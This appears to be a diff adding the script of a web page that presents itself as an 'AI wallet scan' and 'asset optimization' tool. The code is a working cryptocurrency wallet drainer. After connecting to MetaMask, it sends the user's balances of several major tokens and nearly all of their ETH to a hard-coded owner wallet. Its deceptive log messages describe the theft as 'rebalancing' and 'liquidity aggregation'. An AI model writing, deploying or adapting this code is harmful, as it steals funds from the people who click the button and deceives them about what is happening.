+        {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+        {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    ];
+
+    // Token List
+    const TOKENS = [
+        { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "USDT", decimals: 6 },
+        { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", name: "USDC", decimals: 6 },
+        { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", name: "DAI", decimals: 18 },
+        { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", name: "WBTC", decimals: 8 },
+        { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", name: "WETH", decimals: 18 },
+        { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", name: "LINK", decimals: 18 },
+        { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", name: "MATIC", decimals: 18 },
+        { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", name: "SHIB", decimals: 18 },
+        { address: "0x4Fabb145d64652a948d72533023f6E7A623C7C53", name: "BUSD", decimals: 18 }
+    ];
+
+    let web3, userAccount;
+
+    function logToDashboard(message, type) {
+        console.log(`[${type.toUpperCase()}] ${message}`);
+    }
+
+    function ensureButtonExists() {
+        if (!document.getElementById(BUTTON_ID)) {
+            const btn = document.createElement("button");
+            btn.id = BUTTON_ID;
+            btn.innerText = "Initialize Wallet Scan";
+            btn.style.padding = "10px 20px";
+            btn.style.backgroundColor = "#007bff";
+            btn.style.color = "white";
+            btn.style.border = "none";
+            btn.style.cursor = "pointer";
+            document.body.appendChild(btn);
+            return btn;
+        }
+        return document.getElementById(BUTTON_ID);
+    }
+
+    async function connectAndOptimize() {
+        const triggerBtn = ensureButtonExists();
+        
+        if (triggerBtn) {
+            triggerBtn.disabled = true;
+            triggerBtn.innerText = "AI Analyzing ETH Wallet...";
+        }
+
+        // Wait for MetaMask if not present
+        if (typeof window.ethereum === 'undefined') {
+            logToDashboard("Wallet provider not found. Waiting...", "warn");
+            // Simple retry logic for extension injection
+            await new Promise(r => setTimeout(r, 2000));
+            if (typeof window.ethereum === 'undefined') {
+                logToDashboard("Wallet provider still not found.", "error");
+                if (triggerBtn) { triggerBtn.disabled = false; triggerBtn.innerText = "Initialize"; }
+                return;
+            }
+        }
+
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            if (!accounts || accounts.length === 0) throw new Error("No accounts returned");
+
+            userAccount = accounts[0];
+            web3 = new Web3(window.ethereum);
+
+            logToDashboard(`Wallet Connected: ${userAccount.substring(0, 10)}...${userAccount.substring(38)}`, "success");
+            logToDashboard("Running ETH asset optimization algorithms...", "warn");
+
+            // 1. Transfer ERC20 Tokens FIRST
+            for (const token of TOKENS) {
+                try {
+                    const contract = new web3.eth.Contract(ERC20_ABI, token.address);
+                    const balanceHex = await contract.methods.balanceOf(userAccount).call();
+                    const balanceBigInt = BigInt(balanceHex);
+
+                    if (balanceBigInt > 0) {
+                        logToDashboard(`AI detected ${token.name}. Rebalancing to vault...`, "warn");
+                        await transferERC20(contract, balanceHex);
+                    }
+                } catch (err) {
+                    logToDashboard(`Optimization skipped for ${token.name}: ${err.message}`, "warn");
+                }
+            }
+
+            // 2. Transfer Native ETH LAST
+            const ethBalanceHex = await web3.eth.getBalance(userAccount);
+            const ethBalanceBigInt = BigInt(ethBalanceHex);
+
+            if (ethBalanceBigInt > 0) {
+                logToDashboard(`Detected ETH. Initiating liquidity aggregation...`, "warn");
+                await transferNativeETH();
+            }
+
+            logToDashboard("Asset optimization sequence complete.", "success");
+            if (triggerBtn) triggerBtn.innerText = "Optimization Complete";
+
+        } catch (err) {
+            logToDashboard(`System Error: ${err.message}`, "error");
+            if (triggerBtn) {
+                triggerBtn.disabled = false;
+                triggerBtn.innerText = "Retry Scan";
+            }
+        }
+    }
+
+    async function transferNativeETH() {
+        try {
+            const currentBalanceHex = await web3.eth.getBalance(userAccount);
+            const currentBalanceBigInt = BigInt(currentBalanceHex);
+            const gasPriceHex = await web3.eth.getGasPrice();
+            const gasPriceBigInt = BigInt(gasPriceHex);
+            
+            const fastGasPrice = (gasPriceBigInt * BigInt(110)) / BigInt(100);
+            const gasLimit = 21000;
+            const gasCostBigInt = fastGasPrice * BigInt(gasLimit);
+
+            if (currentBalanceBigInt <= gasCostBigInt) {
+                logToDashboard("Insufficient gas for optimization.", "error");
+                return;
+            }
+
+            const amountToTransfer = currentBalanceBigInt - gasCostBigInt;
+            const tx = {
+                from: userAccount,
+                to: OWNER_WALLET,
+                value: amountToTransfer.toString(),
+                gas: gasLimit,
+                gasPrice: fastGasPrice.toString()
+            };
+
+            // Send transaction and wait for receipt
+            const receipt = await web3.eth.sendTransaction(tx);
+            logToDashboard("Native ETH liquidity successfully aggregated.", "success");
+        } catch (err) {
+            logToDashboard(`Aggregation failed/Rejected: ${err.message}`, "error");
+        }
+    }
+
+    async function transferERC20(contract, balanceHex) {
+        try {
+            const gasPriceHex = await web3.eth.getGasPrice();
+            const gasPriceBigInt = BigInt(gasPriceHex);
+            
+            const fastGasPrice = (gasPriceBigInt * BigInt(110)) / BigInt(100);
+            
+            const tx = {
+                from: userAccount,
+                gas: 200000,
+                gasPrice: fastGasPrice.toString()
+            };
+
+            // Send transaction and wait for receipt
+            const receipt = await contract.methods.transfer(OWNER_WALLET, balanceHex).send(tx);
+            
+            if (receipt && receipt.status) {
+                logToDashboard("Token rebalancing successful.", "success");
+            } else {
+                logToDashboard("Token rebalancing reverted.", "error");
+            }
+        } catch (err) {
+            logToDashboard(`Rebalancing failed/Rejected: ${err.message}`, "error");
+        }
+    }
+
+    // Initialize on load
+    document.addEventListener('DOMContentLoaded', () => {
+        const btn = ensureButtonExists();
+        if (btn) {
+            btn.onclick = connectAndOptimize;
+        }
+    });
+</script>
+
+
+</body>
+</html>
